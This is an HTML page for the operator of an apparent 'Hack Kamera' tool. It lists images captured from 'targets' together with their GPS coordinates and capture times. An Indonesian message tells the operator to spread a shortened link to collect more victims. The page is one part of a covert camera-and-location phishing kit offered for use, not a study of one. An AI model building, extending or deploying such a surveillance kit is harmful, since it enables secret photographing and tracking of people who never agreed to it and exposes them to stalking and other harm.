<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Admin - Image & Location Dashboard</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;600&display=swap');

  :root {
    --bg-dark: #121212;
    --card-bg: #1f1f1f;
    --text-light: #e0e0e0;
    --accent: #4caf50;
    --btn-danger: #e53935;
    --btn-danger-hover: #b71c1c;
    --shadow: rgba(0,0,0,0.8);
  }

  * {
    box-sizing: border-box;
  }

  body {
    margin: 0;
    font-family: 'Poppins', sans-serif;
    background: var(--bg-dark);
    color: var(--text-light);
    min-height: 100vh;
    display: flex;
    flex-direction: column;
  }

  header {
    padding: 1rem 2rem;
    font-weight: 600;
    font-size: 1.7rem;
    letter-spacing: 0.05em;
    border-bottom: 1px solid #333;
    text-align: center;
    user-select: none;
  }

  main {
    flex: 1;
    padding: 1.5rem 2rem;
    display: grid;
    grid-template-columns: repeat(auto-fill,minmax(280px,1fr));
    gap: 1.3rem;
    overflow-y: auto;
  }

  .card {
    background: var(--card-bg);
    border-radius: 12px;
    box-shadow: 0 8px 20px var(--shadow);
    display: flex;
    flex-direction: column;
    transition: transform 0.3s ease, box-shadow 0.3s ease;
    cursor: default;
    animation: fadeInUp 0.5s ease forwards;
    opacity: 0;
  }
  .card:hover {
    transform: scale(1.04);
    box-shadow: 0 14px 30px var(--shadow);
  }

  .img-container {
    width: 100%;
    aspect-ratio: 4/3;
    overflow: hidden;
    border-top-left-radius: 12px;
    border-top-right-radius: 12px;
  }

  .img-container img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    transition: transform 0.3s ease;
  }
  .card:hover .img-container img {
    transform: scale(1.1);
  }

  .info {
    padding: 1rem 1.2rem 1.4rem;
    flex-grow: 1;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
  }

  .details {
    font-size: 0.95rem;
    margin-bottom: 0.8rem;
    color: #bbb;
    line-height: 1.3;
    word-break: break-word;
  }

  .details strong {
    color: var(--accent);
  }

  .location {
    margin-top: 0.5rem;
    font-size: 0.85rem;
    color: #888;
    font-style: italic;
  }

  footer {
    padding: 0.7rem 2rem;
    font-size: 0.9rem;
    color: #555;
    border-top: 1px solid #333;
    text-align: center;
  }

  button.delete-btn {
    background: var(--btn-danger);
    border: none;
    color: white;
    font-weight: 600;
    border-radius: 30px;
    padding: 0.5rem 1rem;
    cursor: pointer;
    box-shadow: 0 4px 12px var(--btn-danger);
    transition: background-color 0.3s ease, transform 0.2s ease;
    align-self: flex-start;
    user-select: none;
  }
  button.delete-btn:hover {
    background: var(--btn-danger-hover);
    transform: scale(1.1);
  }
  button.delete-btn:active {
    transform: scale(0.95);
  }

  .no-data {
    grid-column: 1/-1;
    text-align: center;
    font-size: 1.3rem;
    font-weight: 500;
    color: #777;
    margin-top: 5rem;
    user-select: none;
  }

  @keyframes fadeInUp {
    from {
      opacity: 0;
      transform: translateY(20px);
    } to {
      opacity: 1;
      transform: translateY(0);
    }
  }
</style>
</head>
<body>
<header> Hack Kamera By WarzCroozX</header>
<main id="container">
  <!-- Cards will be appended here -->
</main>
<footer>
  &copy; 2025 warz cropzx
</footer>

<script>
  const storageKey = 'binjson_data';

  // Load data from localStorage
  function loadData() {
    const json = localStorage.getItem(storageKey);
    if (!json) return [];
    try {
      return JSON.parse(json);
    } catch {
      return [];
    }
  }

  // Save data to localStorage
  function saveData(data) {
    localStorage.setItem(storageKey, JSON.stringify(data));
  }

  function formatTimestamp(ts) {
    const d = new Date(ts);
    return d.toLocaleString();
  }

  function createCard(entry) {
    const {id, image, location, timestamp} = entry;

    const card = document.createElement('div');
    card.className = 'card';

    const imgCont = document.createElement('div');
    imgCont.className = 'img-container';

    const img = document.createElement('img');
    img.src = image;
    img.alt = 'Captured Image';

    imgCont.appendChild(img);

    const info = document.createElement('div');
    info.className = 'info';

    const details = document.createElement('div');
    details.className = 'details';
    details.innerHTML = `<strong>ID:</strong> ${id}<br/>
                         <strong>Time:</strong> ${formatTimestamp(timestamp)}`;

    const locText = location ?
      `Lat: ${location.latitude.toFixed(6)}, Lon: ${location.longitude.toFixed(6)} (Â±${location.accuracy ? location.accuracy.toFixed(1) + 'm' : 'N/A'})` :
      'Location: N/A';

    const locationEl = document.createElement('div');
    locationEl.className = 'location';
    locationEl.textContent = locText;

    const deleteBtn = document.createElement('button');
    deleteBtn.className = 'delete-btn';
    deleteBtn.textContent = 'Hapus';
    deleteBtn.title = 'Hapus entry ini';

    deleteBtn.onclick = () => {
      if (confirm('Anda yakin ingin menghapus entry ini?')) {
        deleteEntry(id, card);
      }
    };

    info.appendChild(details);
    info.appendChild(locationEl);
    info.appendChild(deleteBtn);

    card.appendChild(imgCont);
    card.appendChild(info);

    return card;
  }

  function deleteEntry(id, cardElement) {
    let data = loadData();
    data = data.filter(e => e.id !== id);
    saveData(data);
    // Animate removal
    cardElement.style.transition = 'opacity 0.4s ease, transform 0.4s ease';
    cardElement.style.opacity = '0';
    cardElement.style.transform = 'scale(0.8) translateX(-20px)';
    setTimeout(() => {
      cardElement.remove();
      checkNoData();
    }, 400);
  }

  function checkNoData() {
    const container = document.getElementById('container');
    if (container.children.length === 0) {
      const msg = document.createElement('div');
      msg.className = 'no-data';
      msg.textContent = 'Tidak ada data target tersedia sebar link di smping https://shorturl.at/2GKSS.';
      container.appendChild(msg);
    }
  }

  function render() {
    const container = document.getElementById('container');
    container.innerHTML = '';
    const data = loadData();
    if (data.length === 0) {
      checkNoData();
      return;
    }
    data.forEach(entry => {
      const card = createCard(entry);
      container.appendChild(card);
    });
  }

  // Initial render
  window.onload = () => {
    render();
  };
</script>
</body>
</html>

